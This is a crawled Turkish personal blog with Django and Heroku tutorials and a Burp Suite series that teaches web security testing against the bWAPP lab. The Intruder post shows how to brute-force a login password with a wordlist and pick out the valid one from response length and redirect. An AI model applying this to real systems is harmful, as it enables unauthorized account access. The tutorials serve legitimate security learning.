{"pages":[{"url":"http://www.mazlumagar.com/pages/about.html","text":"Mazlum Ağar E-mail : info [@] mazlumagar [.] com Konuşmacı ve Eğitmen Olduğum Etkinliker 2015 25-26 Nisan – Ondokuz Mayıs Üniversitesi, Hackercamp 6 Eylül – Hacktrick, Django İle Web Uygulaması Geliştirme 2016 30 Ocak – 2 Şubat – Akademik Bilişim, Enine Boyuna Siber Güvenlik 20-21 Şubat – Hackercamp, Python for Hackers, Kültür Üniversitesi 19-20 Şubat - Heckercamp, Herkes için Python, Sakarya Üniversitesi 6-8 Mayıs - Hacktrick, Web Uygulama Güvenliği 2017 4-7 Şubat 2017 - AB2017, Web Uygulama Güvenliği ve Güvenli Kod Geliştirme","tags":"pages","title":"About Me"},{"url":"http://www.mazlumagar.com/pages/contact.html","text":"Kişisel mail adresim : info [@] mazlumagar [.] com circletwitterbird circlegithubalt circlelinkedin","tags":"pages","title":"Contact"},{"url":"http://www.mazlumagar.com/deny-all-incoming-connections-mac-os.html","text":"Hi guys. I will show how to deny all incoming connections for your security on mac os x. It's very simple because firewall that come by default provides this. Let's start. Go to System Preferences -> Security & Privacy You can see Firewall section in the following screenshot. Click lock button at the bottom left and enter superuser password to access firewall preferences. Then click Firewall Options. You can see applications which allow incoming connections in the above screenshot. After you choose \"Block all incoming connections\", firewall deny all incoming connections. That's all.","tags":"Güvenlik","title":"Deny All Incoming Connections on MAC OS"},{"url":"http://www.mazlumagar.com/heroku-ile-django-uygulamasi-yayinlama.html","text":"Merhabalar, Bu yazıda basit şekilde bir Django uygulaması Heroku üzerinden nasıl yayınlanır ondan bahsedeceğim. Heroku Nedir? Heroku bir bulut uygulama platformudur. Python, Php, Ruby, Java gibi diller ile uygulamalarınızı hızlı bir şekilde geliştirmenize ve yayınlamanıza olanak sağlar. Heroku ve Django Bir Django uygulamasını adım adım nasıl heroku üzerinde yayınlayacağımıza bakalım. İlk önce https://signup.heroku.com/ adresinden kayıt olmanız gerekmektedir. Kayıt işleminin ardından https://devcenter.heroku.com/articles/heroku-command-line sisteminize uygun olanı indirerek kurulum işlemini tamamlayın. Kurulum yaptıktan sonra komut satırından takip eden komutu çalıştırın. $ heroku login Bu komut ile sizden kullanıcı bilgileri istenecektir. Doğru bir şekilde gierek herokuda oturum açma işlemini tamamlayın. Django Django uygulaması oluşturma; $ virtualenv /opt/venv/heroku $ source /opt/venv/heroku/bin/active ( heroku ) ➜ $ pip install Django ( heroku ) ➜ $ django-admin.py startproject django4heroku ( heroku ) ➜ $ cd django4heroku Projemizi oluşturduk. Şimdi proje içerisinde heroku için bazı dosyalar oluşturmamız gerekiyor. requirements.txt Bildiğiniz gibi \"requirements.txt\" dosyası Python projelerinde kullanılan kütüphanelerin listelendiği bir dosyadır. Projeyi deploy etmeye çalıştığımızda heroku bu dosyayı arayacak ve kütüphaneleri kurmak isteyecektir. Eğer bu dosyayı bulamaz ise hata döndürür. (heroku)➜ $ cat requirements.txt Django==1.10.2 gunicorn==19.6.0 Gunicorn Django projesini ayağa kaldırmak için kullandığımız bir web serverdır. Deploy işleminden sonra Heroku sunucusunda projeyi gunicorn ile ayağa kaldıracağız. Procfile Process file, Heroku bu dosya içerisindeki her bir satırı bir process olarak işleme tabi tutacaktır. Bizim Django projesindeki processimiz ise projenin gunicorn ile ayağa kaldırılmasıdır. (heroku)➜ $ cat Procfile web: gunicorn django4heroku.wsgi runtime.txt Çalıştığımız Python sürümünü belirttiğimiz dosyadır. (heroku)➜ $ cat runtime.txt python-2.7.11 Not: Django projesini deploy etmeye çalıştığımızda Heroku python manage.py collectstatic komutunu çalıştıracaktır. Bu komutun hata vermeden çalışabilmesi için takip eden satırı settings.py dosyası içerisine ekleyin. STATIC_ROOT = os.path.join(BASE_DIR, 'static') Heroku App Oluşturma İşin Django tarafını bitirdik. Projenin ana dizininde takip eden komutları çalıştırarak projeyi bir git projesi haline getirelim ve ilk commitimizi yapalım. (heroku)➜ $ git init (heroku)➜ $ git:(master) ✗ git add . (heroku)➜ $ git:(master) ✗ git commit -m\"initial commit\" Heroku ile app oluşturalım. (heroku)➜ $ git:(master) heroku create django4heroku Creating ⬢ django4heroku... done https://django4heroku.herokuapp.com/ | https://git.heroku.com/django4heroku.git (heroku)➜ $ git:(master) heroku apps === mazlum.agar@gmail.com Apps django4heroku Şimdi projemizi deploy edebiliriz. ( heroku ) ➜ $ git :( master ) git push heroku master Counting objects : 11 , done . Delta compression using up to 4 threads . Compressing objects : 100 % ( 7 / 7 ), done . Writing objects : 100 % ( 11 / 11 ), 2.84 KiB | 0 bytes / s , done . Total 11 ( delta 0 ), reused 0 ( delta 0 ) remote : Compressing source files ... done . remote : Building source : remote : remote : -----> Python app detected remote : -----> Installing python - 2.7.11 remote : $ pip install - r requirements . txt remote : Collecting Django == 1.10.2 ( from - r requirements . txt ( line 1 )) remote : Downloading Django - 1.10.2 - py2 . py3 - none - any . whl ( 6.8 MB ) remote : Collecting gunicorn == 19.6.0 ( from - r requirements . txt ( line 2 )) remote : Downloading gunicorn - 19.6.0 - py2 . py3 - none - any . whl ( 114 kB ) remote : Collecting wheel == 0.24.0 ( from - r requirements . txt ( line 3 )) remote : Downloading wheel - 0.24.0 - py2 . py3 - none - any . whl ( 63 kB ) remote : Installing collected packages : Django , gunicorn , wheel remote : Successfully installed Django - 1.10.2 gunicorn - 19.6.0 wheel - 0.24.0 remote : remote : $ python manage . py collectstatic -- noinput remote : 61 static files copied to ' / app / static ' . remote : remote : -----> Discovering process types remote : Procfile declares types -> web remote : remote : -----> Compressing ... remote : Done : 41.5 M remote : -----> Launching ... remote : Released v4 remote : https : //django4heroku.herokuapp.com/ deployed to Heroku remote : remote : Verifying deploy ... done . To https : //git.heroku.com/django4heroku.git * [ new branch ] master -> master Gördüğünüz gibi tüm komutlar heroku sunucusunda başarılı bir şekilde çalıştırıldı. Tarayıcı üzerinden https://django4heroku.herokuapp.com/ adresine gittiğimizde uygulamanın başarılı bir şekilde çalıştığını görebiliyoruz. Komut Çalıştırma (heroku)➜ $ git:(master) heroku run python manage.py migrate (heroku)➜ $ git:(master) heroku run python manage.py runserver Not: Heroku üzerinde database olarak Postgresql kullanmak zorundasınız. Biz bu yazımızda database işlemleri yapmadık. Kolay gelsin.","tags":"Django","title":"Heroku ile Django Uygulaması Yayınlama"},{"url":"http://www.mazlumagar.com/django-custom-mager-yazimi.html","text":"Bu yazıda basit bir şekilde Django ile custom bir Manager nasıl yazılır ondan bahsedeceğim. Manager Nedir ? Manager, Django'da database sorgulama işlemleri için sağlanan arayüz olarak tanımlanabilir. Her model en az bir tane manager içermektedir. Bu terimi bugün ilk defa duyuyor olsanız bile yazdığınız sorgularda objects managerini sürekli kullandınız. Örnek vermek gerekirse, Post.objects.all() Bu yazdığımız sorguyu incelersek, objects bir manager iken, all ise bu managera ait bir fonksiyondur. Şimdi gelin çok basit bir şekilde kendi managerimizi yazalım. Elimizde şu şekilde bir model olduğunu varsayalım. class Comment ( models . Model ): post = models . ForeignKey ( Post , related_name = 'comment' ) name = models . CharField ( max_length = 30 ) content = models . CharField ( max_length = 200 ) status = models . BooleanField ( default = False ) Manager yazmadan önce tüm Commentleri çeken soruguyu yazalım ve sonucunu görelim. >>> Comment.objects.all() [<Comment: Comment object>, <Comment: Comment object>] Gördüğünüz gibi database içerisinde iki tane Comment bulunmakta. Şimdi ise kendi Managerimizi yazalım ve all fonskiyonu çağrıldığında sadece onaylanmış(status=True) commentleri getirelim. from django.db import models class CommentManager ( models . Manager ): def all ( self , * args , ** kwargs ): return super ( CommentManager , self ) . filter ( status = True ) class Comment ( models . Model ): post = models . ForeignKey ( PostModel , related_name = 'comment' ) name = models . CharField ( max_length = 30 ) content = models . CharField ( max_length = 200 ) status = models . BooleanField ( default = False ) objects = CommentManager () Aynı sorguyu tekrar atalım; >>> Comment.objects.all() [<Comment: Comment object>] Gördüğünüz gibi, sadece onaylanmış commentler geldi. Custom bir manager yazmak bu kadar kolay. İhtiyaçlarınız doğrultusunda yeni fonskiyonlar ekleyebilir ve özelleştirebilirsiniz. Kolay gelsin..","tags":"Django","title":"Django Custom Manager Yazımı"},{"url":"http://www.mazlumagar.com/django-custom-decorator-yazimi.html","text":"Merhabalar, Bu yazıda basitçe Django ile custom bir decorator nasıl yazılır? ondan bahsedeceğim. Decorator nedir? sorusunun cevabını yazı içerisinde vermeyeceğim. Bunun için http://ysar.net/python/decorator.html veya https://wiki.python.org/moin/PythonDecorators adreslerini ziyaret edebilirsiniz. Python'da decoratorleri anladıktan sonra Django viewleri için kısaca nasıl yazacağımızdan bahsedelim. Bir örnek üzerinden gidecek olursak: Birden fazla api view'ı yazıyorsunuz ve her view içerisinde kullanıcıdan token gelmiş mi? Gelmiş ise geçerli bir token mı? gibi kontroller yapmaktasınız. Bu kontrolleri her view içerisinde tekrarlamaktan ise bir Decorator yardımı ile nasıl halledeceğimize bakalım. from functools import wraps import json from django.http.response import JsonResponse from django.utils.decorators import available_attrs def custom_decorator ( view_func ): def wrapped_view ( request , * args , ** kwargs ): if request . method == \"POST\" : try : data = json . loads ( request . body . decode ( 'utf-8' )) except ValueError : return JsonResponse ({ 'message' : 'Invalid JSON Parameters' }) token = request_data . get ( 'token' , None ) if not token : return JsonResponse ({ 'message' : 'Invalid token' }) kwargs [ 'data' ] = data return view_func ( request , * args , ** kwargs ) return JsonResponse ({ 'message' : 'Invalid request type' }) return wraps ( view_func , assigned = available_attrs ( view_func ))( wrapped_view ) Decorator yazımı bu kadar basit. Bu şekilde kendi ihtiyaçlarınıza göre değişiklikler, kontroller yapıp kullanabilirsiniz. Yukarıda dikkat ettiyseniz kwargs'a data değişkenini atadık. Bu değişken decorator'ün kullanıldığı view(fonksiyon)'a parametre olarak gidecektir. view üzerinde kullanımı ise şu şekildedir. @custom_decorator def foo(request, data): pass Kolay gelsin..","tags":"Django","title":"Django Custom Decorator Yazımı"},{"url":"http://www.mazlumagar.com/burp-suite-comparer.html","text":"Comparer Burp Comparer iki istek veya cevap arasındaki farkı almaya yarayan bir araçtır. Linux'daki diff komutu gibi düşünebilirsiniz. Yukarıda görüldüğü gibi yaptığımız isteği sağ tıklayarak Comparer'a gönderiyoruz. Burada isteği veya cevabını gönderebilirsiniz. İki isteği birden seçerek veya teker tekere seçerek bu işlemi gerçekleştirebilirsiniz. Seçim işlemini yaptıktan sonra sağ altta bulunan Words veya Bytes butonlarından karşılaştırma işlemlerini yapabilirsiniz. Ben Words butonu ile bu işlemi gerçekleştiriyorum. Burp bizim için karşılaştırma işlemini yaptı ve iki cevap arasındaki farkları bize gösterdi. Sol altta gördüğünüz gibi eklenen, silinen veya modifiye edilen bölümleri farklı renklerde göstermektedir. Sağ altta bulunan Sync views seçeneğini seçerseniz kaydırma işleminde iki cevap senkron olarak kayacaktır.","tags":"Burp Suite","title":"Burp Suite 9: Comparer"},{"url":"http://www.mazlumagar.com/burp-suite-sequencer.html","text":"Sequencer Burp Sequencer uygulama tarafından üretilen kritik tokenların rastgelelik derecesini analiz etmeye yarayan bir araçtır. Kullandığımız uygulamaya login olalım ve bu isteği Sequencer'a gönderelim. Sequencer sayfasına yaptığımız isteğin geldiğini görebiliriz. Gördüğünüz gibi gönderdiğim istek düşmüş durumda. Token Location Within Response kısmından ise Php'nin dönmüş olduğu PHPSESSID 'yi seçiyoruz. Ardından Start live capture butonuna tıklıyoruz. Butona tıkladıktan sonra Sequencer bizim için aynı isteği sürekli tekrarlayacak ve sunucudan PHPSESSID 'leri alacaktır. Yapılan istek sayısı 100 ulaştıktan sonra Analyze now butonu aktif olacaktır. Tıklayarak analiz işlemini başlatabiliriz. Burp yaptığı analiz sonucunda ise bize bir rapor sunacaktır.","tags":"Burp Suite","title":"Burp Suite 8: Sequencer"},{"url":"http://www.mazlumagar.com/burp-suite-repeater.html","text":"Repeater Burp Repeater manuel olarak istekleri modifiye etmenizi ve cevapları analiz etmenizi sağlayan araçtır. Kullanımı da oldukça basit hemen gösterelim. HTTP history sekmesinden yapmış olduğumuz bir isteği Repeater'a gönderiyoruz. Repeater kullanımı aşağıdaki resimde görüldüğü gibidir. Burada gördüğünüz gibi isteği raw olarak düzenleyebilir veya params, headers sekmelerinden ilgili alanların düzenlemesini yapabilirsiniz. Aynı şekilde dönen cevabı raw olarak veya headers, html sekmelerinden inceleyebilirsiniz.","tags":"Burp Suite","title":"Burp Suite 7: Repeater"},{"url":"http://www.mazlumagar.com/burp-suite-intruder.html","text":"Bu yazıda Burp Suite'in Intruder'ını inceleyeceğiz. Intruder Burp Suite Intruder otomatik bir şekilde güvenlik zafiyetlerini belirlemek ve exploit etmek için geliştirilmiş bir araçtır. Neler Yapılabilir SQLi, XSS gibi popüler zafiyetlerinin tespiti Kullanıcı numarası ve kullanı adı gibi tanımlamaların numaralandırılması Brute-force(kaba kuvvet) saldırıları Yanlış konfigüre edilmiş uygulamalarda hassas verilere erişim Kullanımı İlk önce yukarıdaki resimde görüldüğü gibi \"HTTP history\" sekmesinden daha önce yaptığımız isteklerden birine sağ tıklayarak \"Send to Intruder\" seçeneğine tıklıyoruz. Intruder sekmesine gelirseniz gönderdiğimiz isteğin düştüğünü görebilirsiniz. Yukarıdaki resimde gördüğünüz gibi Burp Suite Intruder'ın bizim için tüm değişkenleri farklı bir renkte ve § karakterleri içine aldığını görebilirsiniz. Bu ifadelerin içinde olan herşey Intruder için bir hedef parametredir. Burp otomatik olarak belirlediği değişkenleri marklar. Sağdaki butonlardan ekleme, silme veya otomatik olarak belirleme işlemlerini yapabilirsiniz. Şimdi tüm markları temizledikten sonra sadece password değişkenini işaretliyoruz. Attack type olarak ise Sniper seçili. Birazdan Attack typerlardan bahsedeceğim. Daha sonra payloads sekmesine geçiyoruz. Birinci bölümde Payload set ile markladığımız parametrelerden hangisini uygulayacağımızı seçiyoruz. Sadece bir parametre markladığımız için listede sadece 1 var. Birden fazla marklar iseniz listenin uzadığını görebilirsiniz. Payload type ise payload türünü seçmemize olanak sağlıyor. Biz Simple list seçeceğiz. Kendiniz tüm seçenekleri inceleyebilirsiniz. İkinci bölüm ise seçtiğimi Payload type'a göre şekillenmektedir. Payload oluşturmamıza olanak sağlamaktadır. Add from list listesinden ben 3 letter words seçeneğini seçtiğim için bu şekilde bir liste yüklendi. Burada wordlist oluşmaktadır. Benim gibi Burp'ün bize sunduğu listelerden seçim yapabilir veya kendi wordlistinizi yükleyebilirsiniz. Ayarlamaları yaptıktan sonra sağ üstteki Start Attack butonu ile atağı başlatıyoruz. Ben Add from list listesinden 3 letter words seçeneğini seçtikten sonra Start Attack ile atağı başlatıyorum. Intruder belirlediğim password parametresine listedeki tüm elemanları denedi ve dönen cevapları listeledi. Length'e göre sıraladığımız zaman bir sonucun boyutunun diğerlerinden farklı olduğunu görebiliyoruz. Cevaba çift tıklayarak ayrıntılarını görebilirsiniz. Dönen cevap içerisinde 302 HTTP kodu ile bizi portal.php adresine yönlendirdiğini görebilirsiniz. Buda bug parolasının doğru olduğu anlamına gelmektedir. Attack Types (Atak Tipleri) Yukarıdaki örnekte Attack type olarak Sniper seçmiştik. Intruder içerisinde 4 tane atak tipi bulunmaktadır. Sniper Yukarıdaki örnekte yaptığımız gibi tek parametre hedef alındığında kullanılır. Bettering ram Birden fazla parametre için kullanılır. Tüm parametreler için aynı payload kullanılır. Her parametrenin değeri aynı olacaktır. Pitchfork Tüm parametreler için ayrı payloadlar yüklenir. Burada şöyle bir durum geçerlidir; ilk istekte birinci parametre için birinci payload listesinden birinci elaman ikinci parametre için ikinci parametre listesinden birinci eleman seçilir ve istek yapılır. İkinci istek için birinci listeden ikinci elaman, ikinci listeden ikinci eleman seçilir ve istek yapılır. Bu durum bu şekilde devam eder. Cluster bomb Bu atak tipinde de tüm parametreler için ayrı payloadlar yüklenir. Fakat burada bir çaprazlama söz konusudur. Yani ilk istekte birinci parametre için birinci listeden birinci elaman, ikinci parametre için ikinci listeden birinci eleman seçilir ve istek yapılır. İkinci istek için ise birinci listeden birinci eleman, ikinci listeden ikinci eleman seçilir ve istek yapılır. Bu çaprazlama tüm liste boyunca devam eder.","tags":"Burp Suite","title":"Burp Suite 6: Intruder"},{"url":"http://www.mazlumagar.com/burp-suite-scanner.html","text":"Bu yazıda Burp Suite'in Scanner'ını inceleyeceğiz. Active and Passive Scanning (Aktif ve Pasif Tarama) Şekilde gördüğünüz gibi Burp Suite Scanner'in iki modu bulunmaktadır. Aktif tarama modunda tarama yapma(don't scan) seçeneği seçili iken Pasif tarama herşeyi tara(scan everything) seçeneği seçilidir. Aktif Tarama Aktif taramada Burp Suite bulduğu her bir isteği modifiye ederek tekrar tekrar sunucuya gönderir. Örneğin bir formun submit edildiği sayfa tespit ederse bu forma ait alanları farklı varyasyonlar ile doldurarak yeni istekler gerçekleştirir. Bu şekilde sunucu tarafından gelen yanıtları inceleyerek analiz gerçekleştirir. Aktif tarama sunucuya zarar verebileceği için tavsiye edilmemektedir. Yada yapılacak ise yedeklemeler yapıldıktan sonra yapılması tavsiye edilmektedir. Burp aktif taramayı iki kategoride incelemektedir. XSS, HTTP Header Injection gibi client side güvenlik zafiyetleri SQLi, RCE gibi server side güvenlik zafiyetleri Kullanıcı taraflı güvenlik zafiyetlerinin tespitinde sunucu taraflı güvenlik zafiyetlerinin tespitine göre çok daha başarılıdır. Pasif Tarama Pasif tarama modunda Burp sunucuya herhangi yeni bir istek göndermez. Var olan istek ve cevapları analiz edereke güvenlik zafiyetlerini tespit etmeye çalışır. Burp pasif modda aşağıdaki güvenlik zafiyetlerini tespit edebilir. Clear-text submission of passwords. Insecure cookie attributes, like missing HttpOnly and secure flags. Liberal cookie scope. Cross-domain script includes and Referer leakage. Forms with autocomplete enabled. Caching of SSL-protected content. Directory listings. Submitted passwords returned in later responses. Insecure transmission of session tokens. Leakage of information like internal IP addresses, email addresses, stack traces, etc. Insecure ViewState configuration. Ambiguous, incomplete, incorrect or non-standard Content-type directives Issue Activity Bu menüde Burp Scanner'ın tespit ettiği güvenlik problemleri listelenmektedir. Sadece pasif mod etkin olmasına rağmen Burp birden fazla güvenlik problemi tespit etti ve bunu listeledi. Güvenlik problemine tıkladığınızda aşağıda detaylı açıklamasını göreceksiniz. Issue Definitions Bu menüde Burp içerisinde tanımlı olan güvenlik zafiyetleri ve bu zafiyetlerin detaylı açıklamaları bulunmaktadır. İnceleyebilirsiniz. Options Burp Suite Scanner seçeneklerini inceleyelim. Attack Insertion Points Yapılan isteklerde atakların hangi noktalar üzerinden yapılacağını belirtir. Atakların hangi parametreler üzerinden yapılacağını belirtir. Hangi parametrelerin yer değişeceğini belirtir. (Örneğin URL to body seçilirse URL üzerinde bulunan bir parametre body içerisinde de denenir.) Her bir istekte maximum kaç parametrenin atak noktası olarak seçileceğini belirtir. Bazı isteklerde çok fazla sayıda atak noktası oluşabileceği için bu ayar ile buna bir sınırlama getirilebilir. SQLi gibi server side injectionların atlanacağı parametreleri belirtir. Bu parametreler için atak denemesi yapılmaz. Active Scan Engine Aktif scan ile ilgili thread sayısı gibi tanımlamalar yapılır. Active Scanning Optimization Scan speed Tarama hızını belirtir. Hızlı(fast) tarama daha az istekle ve bazı matematiksel işlemler gereken durumlarda daha az işlem yaparak tarama yapar. Kapsamlı(Thorough) tarama ise daha fazla istek ile her bir parametre için daha fazla atak tipi denenerek yapılır. Normal ise bu iki seçenek arasında orta yolu bularak yapılan taramadır. Scan accuracy Bulunan zafiyetlerde false positive(yanlış alarm) ve false negative durumlarında kaçınamak için taramanın optimizasyonunu belirtir. Active Scanning Areas Aktif taramada test edilecek güvenlik zafiyetlerini belirtir. Örneğin SQL injection seçeneği kaldırılırsa Burp aktif tarama esnasında SQLi denemeyecektir. Demo Aktif ve pasif scan içerisinde don't scan seçeneğini seçtikten sonra Target->Sitemap kısmına geliyoruz. Resimde gördüğünüz gibi seçtiğimiz branch için aktif scan başlatıyoruz. - Daha sonra next ve ok dedikten sonra tarama işlemi başlatılıyor. Scanner->Scan queue sekmesinden tarama durumunu takip edebilirsiniz. - Herhangi bir satıra çift tıklayarak veya sağ tıklayıp \"Show details\" diyerek o URL'e ait tarama detayını görebilirsiniz. Scan Queue sekmesinde sağ tıklayarak Pause Scanner/Resume Scanner seçenekleri ile taramayı durdurabilir veya başlatabilirsiniz. Yine sağ tıklayarak \"Hide finished items\" seçeneği ile biten taramaları listeden kaldırabilirsiniz. Zaten tüm tarama sonuçları \"Issue activity\" sekmesinde bulunmaktadır. Burp ile tarama işlemi bu şekilde. Başka yazıda görüşmek üzere kolay gelsin.","tags":"Burp Suite","title":"Burp Suite 5: Scanner"},{"url":"http://www.mazlumagar.com/burp-suite-spider.html","text":"Bu yazıda Burp Suite'in Spider sekmesini inceleyeceğiz. A Web crawler is an Internet bot which systematically browses the World Wide Web, typically for the purpose of Web indexing (web spidering). daha fazlası Arama motoru botları web sitenizi ziyaret ederek tüm linkleri dolaşır ve indeksler. Bunun sonucunda da arama motoru sonuçlarnda bu sayfaların listelenmesini sağlarlar. Burp Suite Spider'ı ile de aynı işlemi yapıyoruz. Burp Suite spiderı başladıktan sonra scope içerisindeki domainleri gezmeye başlayacak ve bulduğu tüm linkleri dolaşacaktır. Options İlk önce Burp Suite spider seçeneklerine bir bakalım. Crawler Settings Check robots.txt robots.txt dosyaları arama motorları için klavuz niteliğinde olan dosyalardır. Arama motoru botları bu dosyaya bakarak bazı kararlar verirler(hangi sayfaların indekslenmemesi gerektiği gibi). Botların web sayfalarında hiç bir zaman denk gelemeyeceği linkler -admin sayfası gibi- robots.txt içerisinde olabilir. Bu seçenek işaretlendiğinde Burp Spider'ı robots.txt içeriğini okur. Detect custom \"not found\" responses Web sitesi içerisind olmayan bir sayfa ziyaret edilmeye çalışıldığında genelde server 404 response kodu ile cevap döner. Ancak bazen olmayan bir sayfa için farklı bir kod ile (200 gibi) özel olarak tasarlanmış bir sayfa dönülebilir. Bu seçenek işaretlendiğinde Burp Spider'ı bir kaç olmayan sayfa denemesi ile tespit işlemini gerçekleştirir. Ignore links to non-text content Bu seçenek işaretlendiğinde Burp Spider img tagi gibi non-text content(metin dışı içerikleri) takip etmicektir. Bu işlem zaman kazanmak için faydalı olabilir. Request the root of all directories Bu seçenek işaretli ise Burp Spider tüm dizinlerin içeriğini talep edecektir. Eğer hedef sitede dizin indeksleme açık ise, bu seçenek kullanışlı olacaktır. Passive Spidering Burp Spider'ı proxy üzerinden tüm trafiği izleyerek scope haritasının sürekli güncellenmesini sağlar. Passively spider as you browse Bu seçenek seçili ise Burp Spider Proxy üzerindeki tüm istek ve cavapları izler. Form Submission Individuate forms Bu seçenek formların neye göre unique(benzersiz) olması durumunu belirtir. Spider bir form ile karşılaştığı zaman bu formu yeni ise diğer form seçeneklerine göre işlemek üzere sıraya alır. Don't submit forms Bu seçenek işaretli ise Spider herhangi bir formu submit etmez. Prompt for guidance Seçili ise Spider her form ile karşılaştığında bizi uyaracaktır ve formun nasıl gönderilmesi gerektğini bize soracaktır. Automatically submit Seçili ise Spider tanımlı olan kurallara göre formu alanlarını doldurarak formu otomatik submit edecektir. Application Login Bu seçenek Spider'ın login formu ile karşılaştığında ne yapması gerektiğini belirler. Varsayılan olarak Prompt for guidance seçeneği seçilidir. Yani Spider bir login formu ile karşılaştığında ne yapması gerektiğini soracaktır. Handle as ordinary forms Seçili ise Spider login formunu herhangi bir form olarak ele alır ve Form Submission sekmesindeki konfigurasyonlara göre işlem yapar. Automatically submit these credentials Seçili ise Spider verilen username, password bilgileri ile formu doldurur ve submit eder. Spider Engine Spider ile ilgili konfigürasyonların yapıldığı sekmedir. Aynı anda kaç thread açılacağı, network hatası oluştuğunda kaç kere daha deneme yapılacağı gibi ayarlamalar yapılır. Requests Headers Spider'ın yaptığı her istekte gönderilecek olan HTTP Headerlarının belirlendiği kısımdır. Yukarıdaki ekran görüntüsünde görüldüğü gibi Spiderın yaptığı istekte ayarlar kısmında belirtilen Header bilgileri kullanılmıştır. Spider Control Spider Status Status sekmesinden Spider'ın durumunu kontrol edebiliyoruz. Yukarıdaki ekran görüntüsünde gördüğünüz gibi Spider çalışmıyor ve 21 request ve 1 formu kuyruğu almış durumda. Spider'ı çalıştırdıktan sonra toplam 1,343 istek yaptı ve bu sırada 10,861,320 bytes data transferi gerçekleşti.Spider hala çalışıyor siz proxy aracılığı ile gezdiğiniz süre içerisinde keşfettiği linkleri gezmeye devam edecektir. Spider Scope Spider'ın scope alanını belirtir. Varsayılan olarak Target->Scope sekmesinde belirtileni kullanır. Özel olarak scope da belirtebilirsiniz. Son olarak Spider'ı başlatmadan önce ve sonra sitemap sekmesini görelim. Yukarıdaki resimde ben sadece http: //192.168.1.27/bWAPP/login.php adresine istek attığım için sitemap kısmında o sayfada bulunanlar görünüyor. Spider'ı başlattıktan sonra ise Spider bizim için tüm sayfaları dolanarak Sitemap oluşturdu. Burp Suite Spider kullanımı bu kadar kullanışlı ve basit. Sonraki yazıda görüşmek üzere kolay gelsin.","tags":"Burp Suite","title":"Burp Suite 4: Spider"},{"url":"http://www.mazlumagar.com/burp-suite-sitemap-scope.html","text":"Bu yazıda Burp Suite'in sitemap ve scope sekmelerini inceleyeceğiz. Proxy ayarlarını yaptıktan sonra tarayıcı üzerinden gezmeye başladığınızda Burp Suite sizin için gezmiş olduğunuz sitelerin site haritasını çıkartmaya başlayacaktır. Siz gezdikçe Burp Suite de keşfettiği linkleri buraya ekleyecektir. Yukarıdaki resimde gördüğünüz gibi sol tarafta bizim gezdiğimiz domainler. Biz doğrudan istek atmasak bile tarayıcımız istek attığında veya kaynak kodunda bu domainler bulunduğunda Burp bunları ekleyecektir. Contents kısmında ise içerikler ve bu içeriklere ait istek ve cevaplar görülmektedir. En sağ tarafta ise issuelar bulunmaktadır. Burp site haritasını çıkartırken bulduğu problemleri ve problemin açıklamasını bize sunmaktadır. Scope'a Eklemek Burp ile çalışırken ilgilendiğimiz domainleri scopa eklemeliyiz. Ekleme işleminden sonra scope sekmesine geçerseniz domainin eklendiğini görebilirsiniz. Scope sekmesinde 1.bölümde eklediğimiz domainler listeleniyor. Buradan eklenilen domainleri silebilir veya domain ekleme işlemi yapabiliriz. 2.bölümde ise scope alanı içerisinde hariç tutulacak sayfalar belirlenebilir. Burp Suite varsayılan olarak 4 tane tanımlama ile gelmektedir. Bunları silebilir veya yenilerini ekleyebilirsiniz. Sitemap sekmesi içerisinde çok fazla domain görmüştük. Tarayıcıda gezdikçe bu sayının çok daha fazlalaştığını göreceksiniz. Bu alan için filtreleme yapabiliriz. Yukarıdaki resimdeki işaretli alanlar bize farklı kategorilerde filtreleme imkanı sunmaktadır. Ben \"Show only in-scope items\" seçeneğini işaretleyerek sadece Scope'a eklediğim sitelerin görünmesini sağladım bu seçenekten sonra diğer sitelerin filtrelendiğini görebilirsiniz. Sitemap kısmının son hali resimde görüldüğü gibidir.","tags":"Burp Suite","title":"Burp Suite 3: Sitemap ve Scope"},{"url":"http://www.mazlumagar.com/burp-suite-https-ayarı.html","text":"HTTPS Nedir ? HTTPS (İngilizce Secure Hypertext Transfer Protocol, Türkçe güvenli hiper metin aktarım iletişim kuralı) hiper metin aktarım iletişim kuralının (HTTP) güvenli ağ protokolü ile birleştirilmiş olanıdır. Klasik HTTP protokolüne SSL protokolünün eklenmesi ile elde edilir. daha fazlası HTTPS'de kullanılan sertifika domaine özel olarak imzalanır. Dünya üzerinde bazı güvenilir sertifikalar vardır. Bizim setifika alırken yaptığımız işlem ise sadece bu güvenilir sertifikalar tarafından imzalatma işlemidir. (Neden paralı olduğunu anlamadığım bir durum.) Yukarıdaki resimde Firefox tarafından güvenilir olan sertifikaları görebilirsiniz. Biz proxy olarak Burp Suite'i tanımladığımızda Burp'ün sertifikası Firefox'da olmadığı için güvenilir olmayan bir sertifika olduğuna dair uyarı alacaksınız. Bunun için tarayıcıdan http://burp adresine gidiyoruz. Yukarıda resimde gördüğünüz CA Certificate tıklayarak Burp Suite serfifikasını indiriniz. Daha sonra \"Tercihler->Gelişmiş->Sertifikalar->Sertifikaları Göster->İçe aktar\" yolunuz izleyerek indirdiğimiz sertifikayı içeri aktarıyoruz. Bu işlemi yaptıktan sonra https olan siteleri gezerkende Burp Suite'i rahat bir şekilde kullanabileceğiz.","tags":"Burp Suite","title":"Burp Suite 2: HTTPS Ayarı"},{"url":"http://www.mazlumagar.com/burp-suite-giris-ve-ortam-kurulumu.html","text":"Merhabalar, Bu yazı ile başlayan Burp Suite yazı serisi yazmayı planlıyorum. Bu yazıda kısaca Burp Suite nedir? sorusuna cevap arayarak yazı serisi boyunca kullanacağım ortamın ayarlanmasından bahsedeceğim. İleriki yazılarda ise Burp Suite içerisinde bulunan özellikleri sırası ile yazmayı planlamaktayım. Burp Suite Nedir? Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities. Daha kısa tabirle Burp bir proxy aracıdır. Web uygulamaları HTTP protokolünü kullanır ve HTTP protokolü ise istemci/sunucu mimarisi üzerine kurulu olan bir protokoldür. İstemci ve sunucu arasında proxy olarak kullanılan Burp Suite tüm istek ve cevapların ayrıntılı bir şekilde incelenebilmesine ve diğer özellikleri ile farklı işlemler yapılabilmesine olanak sağlayan bir araçtır. Burp Suite ile ilgili daha fazla bilgiye buradan Ortamın Kurulması bWapp bWapp içerisinde güvenlik zafiyetleri barındıran bir web uygulamasıdır. Burp Suite'i kullanırkan isteklerimizi bu web uygulamasına yapacağız. Uygulamayı buradan indirebilirsiniz. İndirdikten sonra sanallaştırma yazılımınız ile(Vmware, Virtualbox) ile live olarak ayağa kaldırabilirsiniz. Uygulama doğrudan çalışacaktır. Kali Linux Burp Suite'i Kali Linux üzerinde çalıştıracağız. Kali 